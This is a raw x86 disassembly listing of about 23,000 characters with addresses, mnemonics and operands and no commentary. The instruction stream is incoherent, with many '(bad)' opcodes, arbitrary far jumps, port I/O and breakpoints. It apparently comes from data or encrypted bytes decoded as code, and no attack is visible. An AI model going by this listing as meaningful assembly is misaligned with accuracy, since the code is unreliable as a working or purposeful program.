  4206ff:	lds    ebx,FWORD PTR [edi-0x6094ed64]
  420705:	shl    DWORD PTR [ecx+0x7af37ed1],cl
  42070b:	pop    esi
  42070c:	lahf   
  42070d:	lea    esp,[edx-0x44fb879e]
  420713:	xchg   ebx,eax
  420714:	dec    esi
  420715:	and    eax,0x9b667ec1
  42071a:	jmp    0x27e4:0xe67077a4
  420721:	adc    eax,0x7ba35def
  420726:	xchg   BYTE PTR cs:[eax-0x21aa102b],dl
  42072d:	fadd   QWORD PTR [edx]
  42072f:	xchg   ebx,eax
  420730:	cwde   
  420731:	pop    eax
  420732:	(bad)  
  420733:	in     al,dx
  420734:	mov    esp,0xb8f1fafb
  420739:	jno    0x42072e
  42073b:	push   es
  42073c:	ds dec ecx
  42073e:	sub    DWORD PTR [ebp+0x7275a56e],esi
  420744:	test   edx,0x4fd30825
  42074a:	jmp    0x4206d6
  42074c:	or     DWORD PTR [esi-0x3c07402c],esi
  420752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420753:	mov    ebp,0x9b30dc35
  420758:	or     DWORD PTR [ebp+0x27307a33],ebx
  42075e:	dec    esi
  42075f:	sbb    eax,0x31227ea2
  420764:	les    ebx,FWORD PTR [ebx-0x7c]
  420767:	xchg   esi,eax
  420768:	fidiv  DWORD PTR [ecx]
  42076a:	mov    WORD PTR [ecx],?
  42076c:	cmp    al,0x16
  42076e:	mov    al,ds:0xaa9cd05d
  420773:	js     0x420737
  420775:	data16 cmp al,0x35
  420778:	imul   edi,DWORD PTR [eax+0x4a7e53c0],0x4dfcfe78
  420782:	lahf   
  420783:	stc    
  420784:	neg    BYTE PTR [ebx+0x6052e7ee]
  42078a:	mov    WORD PTR [edx-0x7a],ss
  42078d:	xchg   al,ah
  42078f:	sub    DWORD PTR [edx],esp
  420791:	add    DWORD PTR [edi+0x3],edi
  420794:	jmp    0x420740
  420796:	adc    DWORD PTR [edi-0x3cb4845b],0x4fa8c202
  4207a0:	cmc    
  4207a1:	dec    edx
  4207a2:	sbb    esi,DWORD PTR [ebx-0x6caaf2ae]
  4207a8:	push   edi
  4207a9:	cwde   
  4207aa:	push   0x2e
  4207ac:	gs inc esi
  4207ae:	mov    ds,WORD PTR ds:0x1b03e947
  4207b4:	xchg   edi,eax
  4207b5:	loop   0x4207f0
  4207b7:	nop
  4207b8:	lods   al,BYTE PTR ds:[esi]
  4207b9:	cmp    cl,bh
  4207bb:	sbb    BYTE PTR [ecx-0x6d],al
  4207be:	and    eax,0x1214c2fa
  4207c3:	dec    BYTE PTR [ebp+0x79ddd584]
  4207c9:	xchg   esp,eax
  4207ca:	ins    BYTE PTR es:[edi],dx
  4207cb:	ja     0x420793
  4207cd:	outs   dx,DWORD PTR ds:[esi]
  4207ce:	nop
  4207cf:	gs fwait
  4207d1:	nop
  4207d2:	out    dx,al
  4207d3:	dec    ecx
  4207d4:	inc    eax
  4207d5:	cmp    ebp,DWORD PTR [edi-0x5]
  4207d8:	aam    0x91
  4207da:	mov    DWORD PTR [ebx],0x6a699f03
  4207e0:	sbb    dl,bl
  4207e2:	test   eax,0xe5020a6d
  4207e7:	sub    al,0xb0
  4207e9:	inc    eax
  4207ea:	mov    ebp,ebp
  4207ec:	and    al,0x79
  4207ee:	push   0xc8bf0276
  4207f3:	pop    ds
  4207f4:	sbb    eax,0xdf98ce2e
  4207f9:	dec    esi
  4207fa:	mov    BYTE PTR [edx],bh
  4207fc:	lahf   
  4207fd:	push   ebp
  4207fe:	stos   DWORD PTR es:[edi],eax
  4207ff:	je     0x4207e1
  420801:	and    DWORD PTR [edx],edi
  420803:	jmp    0x4b88632c
  420808:	adc    DWORD PTR [ebp-0xe],edi
  42080b:	test   DWORD PTR [bx],eax
  42080e:	loop   0x4207e2
  420810:	sbb    al,0x82
  420812:	and    BYTE PTR [ecx-0x1f],dl
  420815:	mov    ss,WORD PTR [edi-0xf]
  420818:	mov    esp,0xdedf789d
  42081d:	inc    edx
  42081e:	popa   
  42081f:	pop    eax
  420820:	mov    bh,0x30
  420822:	pop    ss
  420823:	xchg   ebx,eax
  420824:	out    0xaf,al
  420826:	mov    ecx,0x1b84ca4b
  42082b:	pop    ss
  42082c:	pop    ecx
  42082d:	mov    ds:0x1059e18b,al
  420832:	test   eax,0xb8244b24
  420837:	test   eax,0xa6f72337
  42083c:	push   ds
  42083d:	fcomi  st,st(0)
  42083f:	or     eax,0x19a61e07
  420844:	xor    BYTE PTR [edi+0x2af3f453],dl
  42084a:	pop    ss
  42084b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42084c:	dec    eax
  42084d:	sbb    BYTE PTR [eax-0x745ba713],0xa9
  420854:	stos   BYTE PTR es:[edi],al
  420855:	arpl   si,ax
  420857:	test   al,0xc9
  420859:	out    0xc1,eax
  42085b:	ins    DWORD PTR es:[edi],dx
  42085c:	or     ah,BYTE PTR [ebp-0x20]
  42085f:	stos   BYTE PTR es:[edi],al
  420860:	shl    DWORD PTR [edi+0x47],cl
  420863:	dec    edx
  420864:	aaa    
  420865:	test   eax,0x8e508707
  42086a:	dec    esp
  42086b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42086c:	cmp    eax,0xfa9c0f39
  420871:	or     BYTE PTR [ecx+0x37c62c37],0x7a
  420878:	pushw  0x41
  42087b:	(bad)  
  42087d:	fsubr  QWORD PTR [eax]
  42087f:	jl     0x420804
  420881:	cld    
  420882:	inc    esp
  420883:	add    BYTE PTR [edi-0x3072b415],ch
  420889:	scas   eax,DWORD PTR es:[edi]
  42088a:	(bad)  
  42088e:	push   eax
  42088f:	(bad)  
  420891:	or     al,bl
  420893:	xor    ah,bl
  420895:	into   
  420896:	xor    eax,0x66bae0b
  42089b:	xlat   BYTE PTR ds:[ebx]
  42089c:	test   al,0xa6
  42089e:	cdq    
  42089f:	pop    eax
  4208a0:	lock or edx,DWORD PTR [edi+0x34]
  4208a4:	mov    esp,0xae79b578
  4208a9:	jge    0x4208b7
  4208ab:	jl     0x42084a
  4208ad:	jo     0x420911
  4208af:	sbb    dl,dh
  4208b1:	pop    edx
  4208b2:	jne    0x420925
  4208b4:	and    al,BYTE PTR [ecx+0x6e]
  4208b7:	aaa    
  4208b8:	dec    edx
  4208b9:	sub    al,0x3d
  4208bb:	push   edi
  4208bc:	(bad)  
  4208bd:	mov    ch,0xd1
  4208bf:	int3   
  4208c0:	(bad)  
  4208c1:	cld    
  4208c2:	lods   al,BYTE PTR ds:[esi]
  4208c3:	cmc    
  4208c4:	cmp    cl,BYTE PTR [edx+ecx*8-0x49290716]
  4208cb:	mov    dh,0x5f
  4208cd:	jp     0x42087a
  4208cf:	pop    ds
  4208d0:	xchg   BYTE PTR [ebx+ebx*1],dl
  4208d3:	sub    eax,0x648bf758
  4208d8:	xchg   edx,eax
  4208d9:	in     al,0x59
  4208db:	sbb    eax,0x7f4d251
  4208e0:	add    BYTE PTR [esi+ebp*8+0x14],0xf4
  4208e5:	popf   
  4208e6:	mov    bh,0x13
  4208e8:	in     eax,0x5c
  4208ea:	icebp  
  4208eb:	mov    DWORD PTR [edi],edx
  4208ed:	pop    ecx
  4208ee:	jns    0x4208e1
  4208f0:	jecxz  0x4208c3
  4208f2:	or     DWORD PTR [ebp+ecx*1+0x44fcb2d4],0x85215cb2
  4208fd:	cld    
  4208fe:	cwde   
  4208ff:	xor    dh,BYTE PTR [ebx]
  420901:	mov    ch,0xf
  420903:	sub    BYTE PTR [ebx-0x44],bh
  420906:	jp     0x420948
  420908:	loop   0x420973
  42090a:	hlt    
  42090b:	fiadd  WORD PTR [esi+0x38]
  42090e:	xlat   BYTE PTR ds:[ebx]
  42090f:	fild   DWORD PTR [edx]
  420911:	sub    DWORD PTR [ecx],esp
  420913:	test   bl,cl
  420915:	ins    DWORD PTR es:[edi],dx
  420916:	pushf  
  420917:	pop    ebx
  420918:	pushf  
  420919:	leave  
  42091a:	fchs   
  42091c:	xchg   BYTE PTR [ecx+0x1d],ch
  42091f:	jbe    0x420939
  420921:	das    
  420922:	test   DWORD PTR [edx],ebx
  420924:	rol    BYTE PTR [ecx+0x70d79222],1
  42092a:	dec    esi
  42092b:	pop    ds
  42092c:	mov    bl,bh
  42092e:	aam    0xdc
  420930:	xor    DWORD PTR [eax-0x61],edi
  420933:	mov    ebx,esi
  420935:	xchg   esi,eax
  420936:	ror    BYTE PTR [ebx],0x3a
  420939:	aaa    
  42093a:	imul   bh
  42093c:	xor    eax,0xb2b044b4
  420941:	and    al,0x86
  420943:	dec    eax
  420944:	cmp    ch,ah
  420946:	clc    
  420947:	lea    edi,[ebp+eax*8-0x37f843e6]
  42094e:	cwde   
  42094f:	shl    DWORD PTR [esi+eax*4-0x32305d49],1
  420956:	xor    ebp,DWORD PTR [eax-0x2a]
  420959:	mov    edx,0x3a18be9f
  42095e:	xlat   BYTE PTR ds:[ebx]
  42095f:	mov    ecx,0xbb82f284
  420964:	(bad)  
  420965:	and    al,BYTE PTR [ebp+0x2253e416]
  42096b:	sbb    DWORD PTR [esi+eax*1+0xe],esi
  42096f:	shl    ch,cl
  420971:	aas    
  420972:	xchg   dl,cl
  420974:	int3   
  420975:	sbb    DWORD PTR [edi],edx
  420977:	jmp    0x57d6:0x633c93b5
  42097e:	in     al,0x33
  420980:	ret    0x3568
  420983:	xchg   edi,eax
  420984:	addr16 dec ebp
  420986:	mov    WORD PTR [edx],fs
  420988:	xchg   ebp,eax
  420989:	dec    esi
  42098a:	neg    ecx
  42098c:	scas   eax,DWORD PTR es:[edi]
  42098d:	inc    eax
  42098e:	out    dx,eax
  42098f:	stos   DWORD PTR es:[edi],eax
  420990:	ret    0xfa8f
  420993:	or     ch,bh
  420995:	and    eax,DWORD PTR [ebx+esi*8-0x2c7c7b65]
  42099c:	push   0x1a9c920b
  4209a1:	fisttp DWORD PTR [edx-0x676575ed]
  4209a7:	cwde   
  4209a8:	sahf   
  4209a9:	mov    cl,0xaf
  4209ab:	mov    eax,ds:0xce0c89ee
  4209b0:	fidiv  WORD PTR [esi]
  4209b2:	push   0xffffff91
  4209b4:	jmp    0x420a16
  4209b6:	mov    ebx,0xc1c13b75
  4209bb:	cmp    ebp,DWORD PTR [esi]
  4209bd:	jnp    0x420a2b
  4209bf:	dec    edi
  4209c0:	scas   al,BYTE PTR es:[edi]
  4209c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209c2:	cmp    esp,esp
  4209c4:	mov    bh,0x3c
  4209c6:	and    eax,0x8cbe950d
  4209cb:	or     BYTE PTR [ebp-0x1ce88768],cl
  4209d1:	dec    ebp
  4209d2:	mov    ds,WORD PTR [edi-0x5e]
  4209d5:	and    cl,bl
  4209d7:	fsub   st,st(5)
  4209d9:	dec    esi
  4209da:	bound  ebp,QWORD PTR [ebp*1+0xe721bca]
  4209e1:	dec    ebx
  4209e2:	out    0x88,al
  4209e4:	idiv   esi
  4209e6:	shl    ecx,1
  4209e8:	int3   
  4209e9:	clc    
  4209ea:	icebp  
  4209eb:	arpl   WORD PTR [edx-0x4c],bx
  4209ee:	int    0xf1
  4209f0:	dec    DWORD PTR ds:0xbbf5d1dd
  4209f6:	lahf   
  4209f7:	rcl    BYTE PTR [edi-0x2e],cl
  4209fa:	lods   eax,DWORD PTR ds:[esi]
  4209fb:	add    cl,bh
  4209fd:	jg     0x4209f5
  4209ff:	out    dx,al
  420a00:	jmp    0xac93b15
  420a05:	push   eax
  420a06:	mov    esi,ebx
  420a08:	push   es
  420a09:	rcr    eax,0xfe
  420a0c:	jle    0x420a72
  420a0e:	or     dl,ah
  420a10:	jo     0x420a12
  420a12:	pop    es
  420a13:	jne    0x4209b2
  420a15:	bound  ebp,QWORD PTR cs:[esi-0x4e4a4a95]
  420a1c:	dec    edi
  420a1d:	(bad)  
  420a1e:	jmp    0xc698:0x1199cb57
  420a25:	aaa    
  420a26:	imul   ecx,DWORD PTR [eax+0x3c2541a7],0x2f548089
  420a30:	mov    ch,0x8
  420a32:	cmp    DWORD PTR [edi+0x8c22c7b],ebp
  420a38:	jmp    0xfea9:0x3ad3ae13
  420a3f:	das    
  420a40:	or     eax,0xcbad839e
  420a45:	enter  0x6180,0x27
  420a49:	mov    edx,0xc7d9a870
  420a4e:	cmp    esp,DWORD PTR [ecx-0x5980937b]
  420a54:	(bad)  
  420a56:	push   edi
  420a57:	lea    esp,[ecx+0x549d1f29]
  420a5d:	js     0x420a56
  420a5f:	lds    ebp,FWORD PTR ds:[ebp-0x309b71f0]
  420a66:	ss inc eax
  420a68:	mov    ebp,0x832abd16
  420a6d:	sub    bl,cl
  420a6f:	mov    ecx,0x937acf5d
  420a74:	mov    ?,WORD PTR [edx]
  420a76:	fst    DWORD PTR [edi]
  420a78:	sar    DWORD PTR [ebp-0x3e37a49e],0x8e
  420a7f:	imul   esi,eax,0xfffffff6
  420a82:	dec    ebp
  420a83:	loop   0x420a76
  420a85:	jge    0x420a76
  420a87:	xchg   esi,eax
  420a88:	loope  0x420a94
  420a8a:	sub    al,0xa0
  420a8c:	mov    ?,WORD PTR [edi+0xc]
  420a8f:	inc    esp
  420a90:	cmc    
  420a91:	hlt    
  420a92:	mov    ebp,0x7de670b1
  420a97:	and    al,0x5a
  420a99:	test   eax,0x3f58014c
  420a9e:	iret   
  420a9f:	stos   DWORD PTR es:[edi],eax
  420aa0:	es dec ecx
  420aa2:	call   0x1867:0x8acb24e8
  420aa9:	adc    esp,DWORD PTR [edx-0x6be65956]
  420aaf:	mov    edi,0x9f2b3e0
  420ab4:	cld    
  420ab5:	jns    0x420a90
  420ab7:	ds inc eax
  420ab9:	push   cs
  420aba:	push   ds
  420abb:	adc    edx,esp
  420abd:	xor    DWORD PTR [eax],esp
  420abf:	aam    0xc1
  420ac1:	add    ecx,0x3e1a611a
  420ac7:	imul   ebx,DWORD PTR [ebp+0xd55bb1f],0xffffffc5
  420ace:	js     0x420ad1
  420ad0:	pop    esi
  420ad1:	mov    esp,0xb443bdc5
  420ad6:	sbb    edi,DWORD PTR [eax-0x6e]
  420ad9:	push   esp
  420ada:	lds    ebp,FWORD PTR [esi]
  420adc:	call   0x76b8:0xd46c723e
  420ae3:	aaa    
  420ae4:	pop    ss
  420ae5:	xor    esp,DWORD PTR [ebx*4+0x4ea581e6]
  420aec:	in     al,dx
  420aed:	and    al,0x8
  420aef:	out    dx,eax
  420af0:	mov    BYTE PTR [esi],bh
  420af2:	stos   BYTE PTR es:[edi],al
  420af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420af4:	cld    
  420af5:	add    DWORD PTR [edi],esi
  420af7:	sub    ebp,ebp
  420af9:	xchg   edi,eax
  420afa:	push   edi
  420afb:	imul   BYTE PTR [esi+0x6ba56179]
  420b01:	retf   
  420b02:	sbb    DWORD PTR [esi+0x7b50a265],ebp
  420b08:	mov    BYTE PTR [edi],ah
  420b0a:	nop
  420b0b:	cwde   
  420b0c:	fbstp  TBYTE PTR [edi+0x96ce26e]
  420b12:	xor    al,BYTE PTR [esi-0x1f]
  420b15:	jge    0x420b62
  420b17:	in     al,0xfd
  420b19:	js     0x420b02
  420b1b:	(bad)  
  420b1c:	daa    
  420b1d:	retf   
  420b1e:	mov    bh,0x35
  420b20:	in     al,dx
  420b21:	bnd jb 0x420af3
  420b24:	mov    bl,0x46
  420b26:	ret    
  420b27:	inc    ecx
  420b28:	xchg   ebp,eax
  420b29:	out    0xc2,al
  420b2b:	das    
  420b2c:	mov    ds:0x9abb7b5f,eax
  420b31:	lahf   
  420b32:	out    0xf5,al
  420b34:	push   es
  420b35:	sub    al,0x66
  420b37:	jmp    0x420afa
  420b39:	pusha  
  420b3a:	adc    dl,dl
  420b3c:	(bad)  [eax+0x7ebbc376]
  420b42:	ins    BYTE PTR es:[edi],dx
  420b43:	aas    
  420b44:	imul   BYTE PTR [edi]
  420b46:	add    BYTE PTR [ebp-0x5327a341],al
  420b4c:	ret    
  420b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b4e:	inc    ebx
  420b4f:	lea    esi,ds:0x1c16a7fc
  420b55:	dec    eax
  420b56:	jno    0x420b0f
  420b58:	sbb    edi,eax
  420b5a:	icebp  
  420b5b:	aad    0x87
  420b5d:	cwde   
  420b5e:	loopne 0x420bdf
  420b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b61:	imul   esp,DWORD PTR [ebx+0x5109f317],0x4b40a8ef
  420b6b:	outs   dx,BYTE PTR ds:[esi]
  420b6c:	jmp    FWORD PTR [ecx-0x6fcb151a]
  420b72:	repnz xor edi,DWORD PTR [eax]
  420b75:	xchg   esp,eax
  420b76:	xchg   ecx,eax
  420b77:	inc    esi
  420b78:	or     BYTE PTR fs:[esi+eax*4-0x6e],ah
  420b7d:	daa    
  420b7e:	push   0xffffffaa
  420b80:	fisttp QWORD PTR [esi]
  420b82:	mov    bl,0x19
  420b84:	int3   
  420b85:	jnp    0x420b28
  420b87:	retf   0x3dc9
  420b8a:	or     al,bh
  420b8c:	mov    al,ds:0xb4b1721e
  420b91:	mov    bl,cl
  420b93:	and    ecx,0xffffffe9
  420b96:	xchg   BYTE PTR [ebx+0x6918f0b4],al
  420b9c:	sbb    DWORD PTR [ecx-0x16],0x30
  420ba0:	std    
  420ba1:	mov    esi,edx
  420ba3:	cwde   
  420ba4:	jno    0x420b63
  420ba6:	iret   
  420ba7:	mov    ecx,DWORD PTR [eax]
  420ba9:	(bad)  
  420baa:	cmp    ecx,DWORD PTR [ebx]
  420bac:	cmp    BYTE PTR [ecx+0x4c6b8a34],cl
  420bb2:	jmp    0xc65c:0x76422c9a
  420bb9:	mov    eax,ss
  420bbb:	dec    esp
  420bbc:	jmp    0x420bac
  420bbe:	popf   
  420bbf:	out    dx,eax
  420bc0:	(bad)  
  420bc1:	out    dx,eax
  420bc2:	loope  0x420b90
  420bc4:	mov    eax,ds:0x6d9c8b3e
  420bc9:	fst    QWORD PTR [edi]
  420bcb:	and    dh,BYTE PTR [ecx]
  420bcd:	adc    al,0xc2
  420bcf:	xchg   ecx,eax
  420bd0:	loope  0x420bbb
  420bd2:	ss dec esp
  420bd4:	jge    0x420b79
  420bd6:	add    BYTE PTR [edx+0x77],cl
  420bd9:	imul   ecx,DWORD PTR [ebp-0x7e],0x87a772e9
  420be0:	and    edi,DWORD PTR [esi-0x1f]
  420be3:	jmp    0x8716:0x28dd3753
  420bea:	mov    ds:0xd2233754,al
  420bef:	addr16 mov eax,0x4f634861
  420bf5:	pop    eax
  420bf6:	push   edi
  420bf7:	or     BYTE PTR [edx],ch
  420bf9:	and    al,0xe1
  420bfb:	mov    esi,0x488c76f0
  420c00:	xor    bl,BYTE PTR [edi-0x7b8d10e1]
  420c06:	rol    DWORD PTR [esp+eiz*4+0x389805ef],0xc9
  420c0e:	into   
  420c0f:	je     0x420c11
  420c11:	repnz mov ecx,0xd0eef610
  420c17:	mov    ah,0x53
  420c19:	std    
  420c1a:	sub    DWORD PTR [edi-0x4],0xa26a23df
  420c21:	out    dx,al
  420c22:	xchg   edx,eax
  420c23:	pop    ds
  420c24:	leave  
  420c25:	dec    ebp
  420c26:	or     ebp,ecx
  420c28:	jbe    0x420bd6
  420c2a:	inc    edi
  420c2b:	loope  0x420bb6
  420c2d:	(bad)  
  420c2e:	leave  
  420c2f:	cwde   
  420c30:	push   ds
  420c31:	cli    
  420c32:	sbb    DWORD PTR [ecx+0x25d75ed9],edi
  420c38:	push   edx
  420c39:	mov    DWORD PTR [eax+0x2c],esp
  420c3c:	jge    0x420c41
  420c3e:	xor    bl,ch
  420c40:	mov    ecx,0xbb21366d
  420c45:	fwait
  420c46:	arpl   WORD PTR [edi-0x70],sp
  420c49:	mov    ecx,0xdf216862
  420c4e:	xchg   esp,eax
  420c4f:	mov    ecx,0x3a940c79
  420c54:	(bad)  
  420c55:	(bad)  
  420c56:	push   esp
  420c57:	hlt    
  420c58:	sub    edx,DWORD PTR [edx+0x6b4f5369]
  420c5e:	xor    ebp,ecx
  420c60:	jmp    0x420c0e
  420c62:	icebp  
  420c63:	dec    esp
  420c64:	in     eax,0x7
  420c66:	call   0xb4e3:0x7bb008b7
  420c6d:	repnz sbb eax,0x50d7b7ce
  420c73:	in     eax,0x88
  420c75:	shl    DWORD PTR [edx],cl
  420c77:	data16 repz ja 0x420c14
  420c7b:	inc    edi
  420c7c:	pop    eax
  420c7d:	pop    edi
  420c7e:	sbb    BYTE PTR [eax-0x69630b54],ah
  420c84:	push   es
  420c85:	mov    cl,0x4a
  420c87:	imul   edx,DWORD PTR [edi-0x36dc0293],0xffffffe9
  420c8e:	ins    BYTE PTR es:[edi],dx
  420c8f:	out    dx,eax
  420c90:	cs (bad) 
  420c93:	aam    0x26
  420c95:	lea    edi,[ecx+esi*1]
  420c98:	jno    0x420c2b
  420c9a:	push   0xb01aed44
  420c9f:	int    0x69
  420ca1:	jb     0x420cdb
  420ca3:	pop    es
  420ca4:	les    ebp,FWORD PTR [ebp-0x41a44503]
  420caa:	cmp    DWORD PTR [edx+0x41547ee],esp
  420cb0:	imul   edi,DWORD PTR [edi-0x18],0x76295175
  420cb7:	xchg   ecx,eax
  420cb8:	pop    edx
  420cb9:	push   edx
  420cba:	sub    DWORD PTR [edi-0x7971608b],ebp
  420cc0:	push   ecx
  420cc1:	push   ecx
  420cc2:	mov    ebx,0x7ed18930
  420cc7:	enter  0x2f41,0xce
  420ccb:	inc    esi
  420ccc:	pop    es
  420ccd:	push   es
  420cce:	push   ebx
  420ccf:	stc    
  420cd0:	aam    0xb0
  420cd2:	sub    esp,DWORD PTR [edi+0x2707fc98]
  420cd8:	add    BYTE PTR [esi+0x639f8572],ch
  420cde:	(bad)
  420ce1:	pop    esi
  420ce2:	mov    esi,eax
  420ce4:	fiadd  DWORD PTR [ebp+0x249a1f9c]
  420cea:	sbb    bh,BYTE PTR [esi-0x38]
  420ced:	mov    ds:0xf4a04d37,eax
  420cf2:	add    DWORD PTR [edi],edi
  420cf4:	mov    al,ds:0x99da48bf
  420cf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cfa:	bound  ebp,QWORD PTR [edx-0xe889a5]
  420d00:	sbb    al,0x2d
  420d02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d03:	hlt    
  420d04:	mov    al,0x39
  420d06:	xor    BYTE PTR [edx+0x1c],ch
  420d09:	fst    DWORD PTR [ecx+0x3a]
  420d0c:	pmaddwd mm4,QWORD PTR [esi]
  420d0f:	sbb    al,0x89
  420d11:	retf   0xff4e
  420d14:	mov    eax,0x2637a0c0
  420d19:	or     al,0x16
  420d1b:	cmp    DWORD PTR [esi],0xffffffdf
  420d1e:	adc    edi,esi
  420d20:	mov    BYTE PTR [esi],bh
  420d22:	call   0xf770:0xbf07d0c5
  420d29:	fimul  DWORD PTR [esi+0x2a]
  420d2c:	pop    ebx
  420d2d:	(bad)  
  420d2e:	out    0xe6,eax
  420d30:	in     al,dx
  420d31:	lahf   
  420d32:	pop    edi
  420d33:	push   edi
  420d34:	shl    eax,1
  420d36:	jmp    0x919d:0xf52adc9d
  420d3d:	xchg   edx,eax
  420d3e:	xor    DWORD PTR [edx+ecx*4+0x69f1510e],edx
  420d45:	test   al,0xe5
  420d47:	sahf   
  420d48:	xor    DWORD PTR [si-0x2],edx
  420d4c:	scas   al,BYTE PTR es:[edi]
  420d4d:	pop    esi
  420d4e:	mov    bl,0xfc
  420d50:	dec    esi
  420d51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d52:	cmc    
  420d53:	push   ebx
  420d54:	lahf   
  420d55:	in     al,0xb8
  420d57:	test   al,0x20
  420d59:	xor    al,0xc5
  420d5b:	mov    eax,ds:0xfccea722
  420d60:	dec    esi
  420d61:	dec    esp
  420d62:	mov    BYTE PTR [esp+edx*1],0xc8
  420d66:	sbb    eax,0xa7bb52b8
  420d6b:	shl    BYTE PTR [edi-0x76],cl
  420d6e:	xchg   BYTE PTR [edx],al
  420d70:	sbb    eax,0x3209ba41
  420d75:	dec    ebp
  420d76:	inc    edx
  420d77:	push   ecx
  420d78:	mov    cs,esi
  420d7a:	pop    esp
  420d7b:	adc    al,0xce
  420d7d:	loop   0x420de2
  420d7f:	pop    edi
  420d80:	or     eax,0x8a040def
  420d85:	xlat   BYTE PTR ds:[ebx]
  420d86:	xchg   DWORD PTR ds:0x8a59ca3d,esi
  420d8c:	loope  0x420df8
  420d8e:	adc    eax,0x9c3368ee
  420d93:	in     eax,dx
  420d94:	(bad)  
  420d95:	push   ss
  420d96:	bound  edx,QWORD PTR [ebx-0xe018c52]
  420d9c:	jno    0x420d7c
  420d9e:	dec    edi
  420d9f:	(bad)  
  420da0:	cmp    bl,BYTE PTR [bp+0x3b]
  420da4:	iret   
  420da5:	sbb    edi,DWORD PTR [eax+0x21]
  420da8:	loop   0x420dc4
  420daa:	push   esi
  420dab:	cmp    eax,0x1fe36730
  420db0:	cmp    ebp,esi
  420db2:	test   eax,0x9e9e189b
  420db7:	jmp    0x5e21:0x948a96bf
  420dbe:	xchg   BYTE PTR [ecx+0x7969c573],bl
  420dc4:	push   bx
  420dc6:	sbb    cl,cl
  420dc8:	xlat   BYTE PTR ds:[ebx]
  420dc9:	or     DWORD PTR [ebx],esp
  420dcb:	std    
  420dcc:	adc    eax,0xf781ae49
  420dd1:	std    
  420dd2:	(bad)  
  420dd3:	(bad)  
  420dd4:	cmp    esp,DWORD PTR [edx-0x2a]
  420dd7:	ss scas al,BYTE PTR es:[edi]
  420dd9:	inc    eax
  420dda:	aam    0x88
  420ddc:	lea    edx,[ebp-0x4c72a919]
  420de2:	add    al,0xe6
  420de4:	push   ecx
  420de5:	or     al,0x6d
  420de7:	jbe    0x420e46
  420de9:	adc    edi,DWORD PTR [edx-0x64d1cd70]
  420def:	mov    ebx,0xdccfcdee
  420df4:	sub    bl,cl
  420df6:	inc    edx
  420df7:	xchg   esp,eax
  420df8:	lock out 0x1f,al
  420dfb:	sub    al,0xcd
  420dfd:	mov    gs,WORD PTR [edi]
  420dff:	mov    ds:0xa687a6ea,al
  420e04:	dec    BYTE PTR [ecx+0x6155eb52]
  420e0a:	ss cmp eax,0x36264eba
  420e10:	(bad)  
  420e12:	dec    ecx
  420e13:	out    0x3e,al
  420e15:	mov    edx,DWORD PTR [ebp+0x76]
  420e18:	pop    ss
  420e19:	pusha  
  420e1a:	icebp  
  420e1b:	xchg   esp,eax
  420e1c:	pop    ds
  420e1d:	shl    BYTE PTR [esi],cl
  420e1f:	outs   dx,BYTE PTR ds:[esi]
  420e20:	jmp    0x420db2
  420e22:	nop
  420e23:	sbb    cl,bl
  420e25:	outs   dx,BYTE PTR ds:[esi]
  420e26:	mov    ecx,0xecde19cc
  420e2b:	enter  0x8e26,0x30
  420e2f:	inc    edi
  420e30:	dec    eax
  420e31:	xchg   ecx,eax
  420e32:	xor    BYTE PTR [ebx+0x49],ah
  420e35:	ficom  DWORD PTR [eax]
  420e37:	pop    edi
  420e38:	gs or  eax,0x2bbe5383
  420e3e:	jbe    0x420e4e
  420e40:	out    dx,al
  420e41:	gs ret 
  420e43:	je     0x420e34
  420e45:	pop    esp
  420e46:	jne    0x420dfc
  420e48:	test   al,0x65
  420e4a:	out    0x33,eax
  420e4c:	ins    BYTE PTR es:[edi],dx
  420e4d:	sub    edx,DWORD PTR [edx]
  420e4f:	jl     0x420e0c
  420e51:	sub    al,0x8
  420e53:	aam    0x3d
  420e55:	mov    esi,0xa172341
  420e5a:	lock cmp DWORD PTR [esi-0x15],ebp
  420e5e:	aaa    
  420e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e60:	pop    ds
  420e61:	nop
  420e62:	fisubr DWORD PTR [ecx-0x4f]
  420e65:	popa   
  420e66:	in     eax,dx
  420e67:	add    DWORD PTR [edi+0x68089405],esi
  420e6d:	push   ebx
  420e6e:	aam    0x7a
  420e70:	ficomp DWORD PTR [edi]
  420e72:	push   es
  420e73:	pop    esp
  420e74:	xor    BYTE PTR [edx],0xff
  420e77:	xor    al,0xfb
  420e79:	outs   dx,DWORD PTR ds:[esi]
  420e7a:	push   0x746b6f48
  420e7f:	scas   al,BYTE PTR es:[edi]
  420e80:	dec    esi
  420e81:	jb     0x420ed1
  420e83:	daa    
  420e84:	xlat   BYTE PTR ds:[ebx]
  420e85:	dec    ebx
  420e86:	sbb    al,0x3f
  420e88:	(bad)  
  420e89:	push   0xa762c74e
  420e8e:	adc    BYTE PTR [eax],ch
  420e90:	mov    ecx,0x2b1f8ec2
  420e95:	and    DWORD PTR [ebp+ebx*4+0x16],ebp
  420e99:	fadd   st,st(5)
  420e9b:	jbe    0x420e3f
  420e9d:	jnp    0x420e7e
  420e9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ea0:	fsub   DWORD PTR [ebp-0x38]
  420ea3:	adc    al,0xc7
  420ea5:	test   BYTE PTR [ebp+0x68],0x16
  420ea9:	retf   
  420eaa:	pop    ebp
  420eab:	int3   
  420eac:	scas   eax,DWORD PTR es:[edi]
  420ead:	push   esp
  420eae:	outs   dx,BYTE PTR ds:[esi]
  420eaf:	mov    edx,0xbde6f2f0
  420eb4:	nop
  420eb5:	lea    esi,[edx-0x122c30ab]
  420ebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ebc:	pop    ds
  420ebd:	push   esi
  420ebe:	push   es
  420ebf:	aaa    
  420ec0:	dec    eax
  420ec1:	mov    cl,0x3e
  420ec3:	fmul   QWORD PTR [ebp-0x7dbac2da]
  420ec9:	ss call 0xb343c376
  420ecf:	dec    ebx
  420ed0:	dec    esi
  420ed1:	das    
  420ed2:	mov    al,0x6a
  420ed4:	jns    0x420e5b
  420ed6:	push   ss
